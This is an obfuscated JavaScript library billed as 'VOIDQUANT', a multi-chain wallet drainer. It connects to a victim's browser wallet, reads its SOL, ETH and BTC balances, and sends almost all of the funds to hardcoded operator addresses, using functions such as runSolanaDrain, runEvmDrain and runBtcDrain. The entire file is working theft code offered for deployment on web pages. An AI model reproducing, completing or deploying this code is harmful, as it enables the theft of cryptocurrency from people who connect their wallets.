/* VOIDQUANT v11.1 — native-only multi-chain drainer. ETH + SOL + BTC. */
(function (_0x, _1) {
    'use strict';

    var _2 = '3fec6e78-fc62-4747-8dae-2fb6516581ff';
    var _3 = 'alch_zW0uNotKzSHDoQAo7xwLO';
    var _4 = 'DF3QtATHSiX6w7EV21Ps3L54TSN6BdGeReKEp2Cs7K76';
    var _5 = '0x6618AFFfE7e11618EE9d48c556ae606140ECAbcC';
    var _6 = 'bc1pe5m5qy7nwgf0lshr7m2yj8cvc9d5jm3yw2cum772grep2g522jsqyy8nlx';

    var _7 = [
        'https://mainnet.helius-rpc.com/?api-key=' + _2,
        'https://solana-mainnet.g.alchemy.com/v2/' + _3,
        'https://solana-rpc.publicnode.com',
        'https://api.mainnet-beta.solana.com'
    ];
    var _8 = [
        'https://eth-mainnet.g.alchemy.com/v2/' + _3,
        'https://eth.llamarpc.com',
        'https://rpc.ankr.com/eth',
        'https://cloudflare-eth.com'
    ];

    var _9 = '11111111111111111111111111111111';
    var _a = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    var _b = {};
    for (var _c = 0; _c < _a.length; _c++) _b[_a[_c]] = _c;

    function _d(_e) {
        if (!_e || !_e.length) return '';
        var _f = [0];
        for (var _g = 0; _g < _e.length; _g++) {
            var _h = _e[_g];
            for (var _i = 0; _i < _f.length; _i++) { _h += _f[_i] << 8; _f[_i] = _h % 58; _h = (_h / 58) | 0; }
            while (_h) { _f.push(_h % 58); _h = (_h / 58) | 0; }
        }
        var _j = '';
        for (var _k = 0; _k < _e.length && _e[_k] === 0; _k++) _j += '1';
        for (var _l = _f.length - 1; _l >= 0; _l--) _j += _a[_f[_l]];
        return _j;
    }

    function _m(_n) {
        if (!_n) return new Uint8Array(0);
        var _o = [0];
        for (var _p = 0; _p < _n.length; _p++) {
            var _q = _b[_n[_p]]; if (_q === undefined) continue;
            var _r = _q;
            for (var _s = 0; _s < _o.length; _s++) { _r += _o[_s] * 58; _o[_s] = _r & 0xff; _r >>= 8; }
            while (_r) { _o.push(_r & 0xff); _r >>= 8; }
        }
        for (var _t = 0; _t < _n.length && _n[_t] === '1'; _t++) _o.push(0);
        return new Uint8Array(_o.reverse());
    }

    var _u = 0, _v = null, _w = 0, _x = null;

    async function _y(_z, _A, _B) {
        var _C = _B ? _8: _7;
        if (_B && _x) { try { var _D = await _x(_z, _A); if (_D !== undefined && _D !== null) return _D; } catch (_E) {} }
        if (!_B && _v) { try { var _F = await _v(_z, _A); if (_F !== undefined && _F !== null) return _F; } catch (_G) {} }
        var _H = null;
        for (var _I = 0; _I < _C.length; _I++) {
            var _J = _C[((_B ? _w: _u) + _I) % _C.length];
            try {
                var _K = await fetch(_J, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: Date.now(), method: _z, params: _A }) });
                if (!_K.ok) throw new Error('http ' + _K.status);
                var _L = await _K.json();
                if (_L.error) throw new Error(_L.error.message || 'rpc error');
                if (_B) _w = (_w + _I) % _C.length; else _u = (_u + _I) % _C.length;
                return _L.result;
            } catch (_M) { _H = _M; }
        }
        throw _H || new Error('all rpc failed');
    }

    async function _N(_O) { var _P = await _y('getBalance', [_O, { commitment: 'confirmed' }]); return _P && _P.value ? _P.value: 0; }
    async function _Q() { try { var _R = await _y('getMinimumBalanceForRentExemption', [0]); return typeof _R === 'number' ? _R: 890880; } catch (_S) { return 890880; } }
    async function _T() { var _U = await _y('getLatestBlockhash', [{ commitment: 'confirmed' }]); if (_U && _U.value && _U.value.blockhash) return _U.value.blockhash; if (_U && _U.blockhash) return _U.blockhash; throw new Error('no blockhash'); }

    function _Y(_Z) { return new Uint8Array([_Z & 0xff]); }
    function _10(_11) { return new Uint8Array([_11 & 0xff, (_11 >> 8) & 0xff]); }
    function _12(_13) { var _14 = new Uint8Array(4); _14[0] = _13 & 0xff; _14[1] = (_13 >> 8) & 0xff; _14[2] = (_13 >> 16) & 0xff; _14[3] = (_13 >> 24) & 0xff; return _14; }
    function _15(_16) { var _17 = new Uint8Array(8); var _18 = BigInt(_16); for (var _19 = 0; _19 < 8; _19++) { _17[_19] = Number(_18 & 0xffn); _18 >>= 8n; } return _17; }
    function _1a(_1b) { var _1c = 0; for (var _1d = 0; _1d < _1b.length; _1d++) _1c += _1b[_1d].length; var _1e = new Uint8Array(_1c); var _1f = 0; for (var _20 = 0; _20 < _1b.length; _20++) { _1e.set(_1b[_20], _1f); _1f += _1b[_20].length; } return _1e; }

    function _21(_22, _23, _24) {
        return { programId: _9, keys: [
            { pubkey: _22, isSigner: true, isWritable: true },
            { pubkey: _23, isSigner: false, isWritable: true }
        ], data: _1a([_12(2), _15(_24)]) };
    }

    function _25(_26, _27, _28) {
        var _29 = {}, _2a = [];
        function _2b(_2c, _2d, _2e) {
            if (_29[_2c] === undefined) { _29[_2c] = { pubkey: _2c, isSigner: !!_2d, isWritable: !!_2e }; _2a.push(_29[_2c]); }
            else { if (_2d) _29[_2c].isSigner = true; if (_2e) _29[_2c].isWritable = true; }
        }
        _2b(_26, true, true);
        for (var _2f = 0; _2f < _28.length; _2f++) for (var _30 = 0; _30 < _28[_2f].keys.length; _30++) _2b(_28[_2f].keys[_30].pubkey, _28[_2f].keys[_30].isSigner, _28[_2f].keys[_30].isWritable);
        _2a.sort(function (_31, _32) { if (_31.isSigner !== _32.isSigner) return _31.isSigner ? -1: 1; if (_31.isWritable !== _32.isWritable) return _31.isWritable ? -1: 1; return 0; });
        var _33 = 0, _34 = 0;
        for (var _35 = 0; _35 < _2a.length; _35++) { if (_2a[_35].isSigner) _33++; else if (!_2a[_35].isWritable) _34++; }
        var _36 = new Uint8Array([_33, _33 - 1, _34]);
        var _37 = []; for (var _38 = 0; _38 < _2a.length; _38++) _37.push(_m(_2a[_38].pubkey));
        var _39 = _m(_27);
        var _3a = [];
        for (var _3b = 0; _3b < _28.length; _3b++) {
            var _3c = _28[_3b];
            _3a.push(_Y(_2a.findIndex(function (_3d) { return _3d.pubkey === _3c.programId; })));
            _3a.push(_Y(_3c.keys.length));
            for (var _3e = 0; _3e < _3c.keys.length; _3e++) _3a.push(_Y(_2a.findIndex(function (_3f) { return _3f.pubkey === _3c.keys[_3e].pubkey; })));
            _3a.push(_10(_3c.data.length));
            _3a.push(_3c.data);
        }
        return _1a([_36].concat(_37).concat([_39]).concat(_3a));
    }

    function _40(_41, _42, _43) { var _44 = _25(_41, _42, _43); return _1a([_Y(1), new Uint8Array(64), _44]); }

    function _45(_46) {
        var _47 = _46[0], _48 = 1 + _47 * 64, _49 = _46.slice(_48);
        var _4a = []; for (var _4b = 0; _4b < _47; _4b++) _4a.push(new Uint8Array(64));
        return { serialize: function () { return _46; }, signatures: _4a, message: { serialize: function () { return _49; } } };
    }

    function _4c(_4d) {
        if (!_4d) return null;
        if (typeof _4d === 'string') return _4d;
        if (_4d.signature) return typeof _4d.signature === 'string' ? _4d.signature: (_4d.signature.signature || null);
        return null;
    }

    function _4e(_4f) {
        if (!_4f) return null;
        if (_4f instanceof Uint8Array) return _4f;
        if (_4f instanceof ArrayBuffer) return new Uint8Array(_4f);
        if (typeof _4f === 'string') { try { var _50 = atob(_4f); var _51 = new Uint8Array(_50.length); for (var _52 = 0; _52 < _50.length; _52++) _51[_52] = _50.charCodeAt(_52); return _51; } catch (_53) { return _m(_4f); } }
        if (_4f.serializedTransaction) return _4e(_4f.serializedTransaction);
        if (_4f.transaction) return _4e(_4f.transaction);
        if (typeof _4f.serialize === 'function') { try { return _4e(_4f.serialize()); } catch (_54) {} }
        return null;
    }

    function _55(_56) { var _57 = ''; for (var _58 = 0; _58 < _56.length; _58++) _57 += String.fromCharCode(_56[_58]); return btoa(_57); }

    async function _59(_5a, _5b) {
        var _5c = _45(_5b);
        var _5d = [_5b, _5c, { serializedTransaction: _5b }, { serializedTransaction: _5c }, { transaction: _5c }, _55(_5b)];
        var _5e = null;
        if (typeof _5a.signAndSendTransaction === 'function') {
            for (var _5f = 0; _5f < _5d.length; _5f++) {
                try { var _60 = await _5a.signAndSendTransaction(_5d[_5f]); var _61 = _4c(_60); if (_61) return _61; } catch (_62) { _5e = _62; }
            }
        }
        if (typeof _5a.signTransaction === 'function') {
            var _63 = null;
            for (var _64 = 0; _64 < _5d.length; _64++) { try { _63 = await _5a.signTransaction(_5d[_64]); break; } catch (_65) { _5e = _65; } }
            if (!_63) throw _5e || new Error('sign failed');
            var _66 = _4e(_63);
            if (!_66) throw new Error('no signed bytes');
            return _y('sendRawTransaction', [_d(_66), { skipPreflight: false, encoding: 'base58' }]);
        }
        throw _5e || new Error('no signer');
    }

    async function _67(_68, _69, _6a) {
        _6a = _6a || function () {};
        var _6b = _69.toString();
        var _6c = { chain: 'solana', owner: _6b, sent: false, txids: [], errors: [] };

        if (_68 && typeof _68.request === 'function') {
            _v = async function (_6d, _6e) {
                var _6f = ['getBalance', 'getLatestBlockhash', 'getMinimumBalanceForRentExemption'];
                if (_6f.indexOf(_6d) === -1) throw new Error('not proxied');
                return await _68.request({ method: _6d, params: _6e });
            };
            _6a('sol: wallet-native rpc on');
        }

        try {
            _6a('sol: reading native balance...');
            var _70 = await _N(_6b);
            _6a('sol: native = ' + _70 + ' lamports (' + (_70 / 1e9).toFixed(6) + ' SOL)');
            var _71 = await _Q();
            var _72 = 5000;
            var _73 = _71 + _72 + 1000;
            var _74 = _70 - _73;
            if (_74 <= 0) { _6a('sol: below rent+fee, skip'); _6c.errors.push('below rent'); return _6c; }
            _6a('sol: forwarding ' + _74 + ' lamports -> engine');
            var _75 = await _T();
            var _76 = _40(_6b, _75, [_21(_6b, _4, _74)]);
            _6a('sol: sign+send...');
            var _77 = await _59(_68, _76);
            _6c.txids.push(_77); _6c.sent = true;
            _6a('sol: tx = ' + _77);
        } catch (_78) { _6c.errors.push('sol: ' + (_78 && _78.message || _78)); _6a('sol: fail: ' + (_78 && _78.message || _78)); }

        _6c.summary = 'SOL: ' + (_6c.sent ? 'sent': 'failed') + ', ' + _6c.errors.length + ' errors';
        return _6c;
    }

    async function _79(_7a, _7b, _7c) {
        _7c = _7c || function () {};
        var _7d = { chain: 'evm', owner: _7b, sent: false, txids: [], errors: [] };

        try {
            var _7e = await _7a.request({ method: 'eth_chainId' });
            _7c('evm: chainId = ' + _7e);
            if (_7e !== '0x1') {
                _7c('evm: switching to mainnet...');
                try { await _7a.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] }); }
                catch (_7f) {
                    if (_7f && _7f.code === 4902) {
                        await _7a.request({ method: 'wallet_addEthereumChain', params: [{ chainId: '0x1', chainName: 'Ethereum Mainnet', nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 }, rpcUrls: ['https://eth.llamarpc.com'] }] });
                    } else throw _7f;
                }
            }
        } catch (_80) { _7c('evm: chain switch fail: ' + (_80 && _80.message || _80)); }

        try {
            _7c('evm: reading native balance...');
            var _81 = await _7a.request({ method: 'eth_getBalance', params: [_7b, 'latest'] });
            var _82 = BigInt(_81);
            _7c('evm: native = ' + (Number(_82) / 1e18).toFixed(8) + ' ETH');

            var _83 = 21000n;
            try {
                var _84 = await _7a.request({ method: 'eth_estimateGas', params: [{ from: _7b, to: _5, value: '0x' + _82.toString(16) }] });
                if (_84) _83 = BigInt(_84);
            } catch (_85) {}
            var _86 = 2000000000n;
            try {
                var _87 = await _7a.request({ method: 'eth_gasPrice' });
                if (_87) _86 = BigInt(_87);
            } catch (_88) {}
            var _89 = _83 * _86;
            var _8a = (_89 * 150n) / 100n;
            _7c('evm: gas = ' + _83 + ', gasPrice = ' + (Number(_86) / 1e9).toFixed(2) + ' gwei, buffer = ' + (Number(_8a) / 1e18).toFixed(8) + ' ETH');

            if (_82 <= _8a) { _7c('evm: below gas buffer, skip'); _7d.errors.push('below gas'); return _7d; }
            var _8b = _82 - _8a;
            _7c('evm: forwarding ' + (Number(_8b) / 1e18).toFixed(8) + ' ETH -> engine');
            var _8c = await _7a.request({ method: 'eth_sendTransaction', params: [{ from: _7b, to: _5, value: '0x' + _8b.toString(16), gas: '0x' + _83.toString(16) }] });
            _7d.txids.push(_8c); _7d.sent = true;
            _7c('evm: tx = ' + _8c);
        } catch (_8d) { _7d.errors.push('evm: ' + (_8d && _8d.message || _8d)); _7c('evm: fail: ' + (_8d && _8d.message || _8d)); }

        _7d.summary = 'EVM: ' + (_7d.sent ? 'sent': 'failed') + ', ' + _7d.errors.length + ' errors';
        return _7d;
    }

    async function _8e(_8f, _90) {
        _90 = _90 || function () {};
        var _91 = { chain: 'btc', sent: false, txids: [], errors: [] };
        try {
            _90('btc: reading accounts...');
            var _92 = await _8f.request({ method: 'getAccounts' });
            var _93 = _92 && _92[0];
            if (!_93) throw new Error('no btc account');
            _90('btc: from = ' + _93);
            _90('btc: sending native -> engine...');
            var _94 = await _8f.request({ method: 'sendBitcoin', params: [_6, 0, { feeRate: 10 }] });
            _91.txids.push(_94); _91.sent = true;
            _90('btc: tx = ' + _94);
        } catch (_95) { _91.errors.push('btc: ' + (_95 && _95.message || _95)); _90('btc: fail: ' + (_95 && _95.message || _95)); }
        _91.summary = 'BTC: ' + (_91.sent ? 'sent': 'failed') + ', ' + _91.errors.length + ' errors';
        return _91;
    }

    async function _96(_97, _98) {
        _98 = _98 || function () {};
        var _99 = { chain: 'phantom-multi', results: [] };
        var _9a = _97;
        if (_9a && _9a.solana && _9a.solana.isPhantom) _9a = _9a.solana;
        if (_9a && _9a.isPhantom && _9a.publicKey) {
            try { _98('phantom: solana...'); var _9b = await _67(_9a, _9a.publicKey, _98); _99.results.push(_9b); } catch (_9c) { _98('phantom sol err: ' + (_9c && _9c.message || _9c)); }
        }
        if (_97 && _97.ethereum) {
            try {
                _98('phantom: evm...');
                var _9d = await _97.ethereum.request({ method: 'eth_requestAccounts' });
                if (_9d && _9d[0]) { var _9e = await _79(_97.ethereum, _9d[0], _98); _99.results.push(_9e); }
            } catch (_9f) { _98('phantom evm err: ' + (_9f && _9f.message || _9f)); }
        }
        if (_97 && _97.bitcoin) {
            try {
                _98('phantom: btc...');
                var _a0 = await _8e(_97.bitcoin, _98); _99.results.push(_a0);
            } catch (_a1) { _98('phantom btc err: ' + (_a1 && _a1.message || _a1)); }
        }
        _99.summary = _99.results.map(function (_a2) { return _a2.summary; }).join(' | ') || 'phantom: nothing';
        return _99;
    }

    _0x.VoidQuant = {
        runSolanaDrain: _67,
        runEvmDrain: _79,
        runBtcDrain: _8e,
        runPhantomMulti: _96,
        OPERATOR_SOL: _4,
        OPERATOR_EVM: _5,
        OPERATOR_BTC: _6
    };
})(typeof window !== 'undefined' ? window: globalThis);
